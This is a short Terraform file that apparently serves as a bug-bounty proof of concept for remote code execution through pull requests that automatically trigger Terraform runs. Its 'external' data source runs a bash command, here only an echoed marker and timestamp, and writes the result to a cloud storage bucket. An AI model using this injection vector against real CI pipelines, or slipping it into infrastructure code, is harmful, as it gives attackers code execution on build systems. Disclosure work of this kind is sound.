terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "github_pr_rce" {
  program = ["bash", "-c", "echo '{\"proof\": \"REAL_GITHUB_PR_AUTO_TRIGGER_RCE\", \"time\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\"}'"]
}

resource "google_storage_bucket_object" "marker" {
  name    = "im-pr-attack-test/marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.github_pr_rce.result.proof
}

output "rce_proof" { value = data.external.github_pr_rce.result.proof }
